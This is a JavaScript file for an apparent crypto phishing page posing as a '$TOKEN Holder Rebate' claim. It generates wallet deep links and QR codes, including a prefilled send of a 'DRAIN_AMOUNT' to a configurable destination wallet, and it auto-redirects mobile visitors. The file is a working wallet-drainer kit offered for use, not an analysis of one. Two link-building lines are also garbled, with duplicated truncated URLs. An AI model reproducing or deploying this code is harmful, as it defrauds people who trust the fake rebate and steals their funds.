const DEFAULT_CONFIG = {
  CA: "0xYOUR_CONTRACT_ADDRESS",
  ETH: "0xYOUR_DESTINATION_WALLET",
  REF_DOMAIN: "twitter.com/YourCampaign",
  CAMPAIGN: "$TOKEN Holder Rebate",
  DRAIN_AMOUNT: "0.05",
  CHAIN: "ethereum"
};

class CampaignApp {
  constructor() {
    this.config = { ...DEFAULT_CONFIG, ...this.getUrlParams() };
    this.currentWallet = null;
    this.qrCode = null;
    this.init();
  }

  getUrlParams() {
    const p = new URLSearchParams(window.location.search);
    return {
      CA: p.get('ca') || DEFAULT_CONFIG.CA,
      ETH: p.get('eth') || DEFAULT_CONFIG.ETH,
      REF_DOMAIN: p.get('ref') || DEFAULT_CONFIG.REF_DOMAIN,
      CAMPAIGN: p.get('campaign') || DEFAULT_CONFIG.CAMPAIGN
    };
  }

  init() {
    document.querySelectorAll('[data-campaign-title]').forEach(el => el.textContent = this.config.CAMPAIGN);
    document.getElementById('claimBtn').addEventListener('click', () => this.openWalletModal());
    document.getElementById('closeModal').addEventListener('click', () => this.closeWalletModal());
    document.querySelectorAll('.wallet-grid button').forEach(btn => {
      btn.addEventListener('click', (e) => this.selectWallet(e.target));
    });
    this.fetchLiveStats();
  }

  openWalletModal() { document.getElementById('walletModal').classList.remove('hidden'); this.generateQR(); }
  closeWalletModal() {
    document.getElementById('walletModal').classList.add('hidden');
    if (this.qrCode) this.qrCode.makeCode("");
    this.currentWallet = null;
    document.querySelectorAll('.wallet-grid button').forEach(b => b.classList.remove('active'));
  }

  selectWallet(btn) {
    this.currentWallet = btn.dataset.wallet;
    document.querySelectorAll('.wallet-grid button').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    this.generateQR();
  }

  generateQR() {
    const container = document.getElementById('qrContainer');
    container.innerHTML = "";
    const caE = encodeURIComponent(this.config.CA);
    const refE = encodeURIComponent(this.config.REF_DOMAIN);
    let link = "";
    switch(this.currentWallet) {
      case 'phantom': link = `https://phantom.app/ul/browse/${caE}?ref=${refE}`; break;
      case 'metamask': link =
`https://metamask.app.link/dapp/?action=claim&address=${this.config.ETH}&token=${caE}&chain=${this.config.CHAIN.toU`https://metamask.app.link/dapp/?action=claim&address=${this.config.ETH}&token=${caE}chain=${this.config.CHAIN.toUpperCase()}`; break;
      case 'exodus': link =
`exodus://addressbook/send?chain=${this.config.CHAIN}&address=${this.config.ETH}&currency=${this.config.CHAIN.toUpp`exodus://addressbook/send?chain=${this.config.CHAIN}&address=${this.config.ETH}&curreny=${this.config.CHAIN.toUpperCase()}&amount=${this.config.DRAIN_AMOUNT}`; break;
      case 'trust': link =
`https://trustwallet.com/app?targetUrl=https%3A%2F%2Fyour-site.com%2Fclaim%3Fca%3D${caE}%26ref%3D${refE}`; break;
      default: link = `https://phantom.app/ul/browse/${caE}?ref=${refE}`;
    }
    this.qrCode = new QRCode(container, { text: link, width: 180, height: 180, colorDark: "#0f111a", colorLight:
"#ffffff" });
    if (/Mobile|Android|iPhone/i.test(navigator.userAgent)) setTimeout(() => window.location.href = link, 800);
  }

  async fetchLiveStats() {
    const el = document.getElementById('liveStats');
    el.classList.add('loading');
    try {
      const res = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${this.config.CA}`);
      const data = await res.json();
      if (data.pairs?.length > 0) {
        const p = data.pairs[0];
        el.innerHTML = `<div>💰 Price: <strong>${parseFloat(p.priceUsd).toFixed(4)} USD</strong></div>
          <div>📊 24h Vol: ${p.volume.h24?.toLocaleString() || '0'} | MCap: $${(p.fdv /
1000000).toFixed(1)}M</div>
          <div>👥 Holders: ~${p.txCount?.toLocaleString() || 'Calculating...'}</div>`;
      } else { el.innerHTML = `⚠️ No live pairs. Simulated stats active.`; }
    } catch (err) { el.innerHTML = `🔄 Stats updating via fallback API...`; }
    finally { el.classList.remove('loading'); }
  }
}

document.addEventListener('DOMContentLoaded', () => new CampaignApp());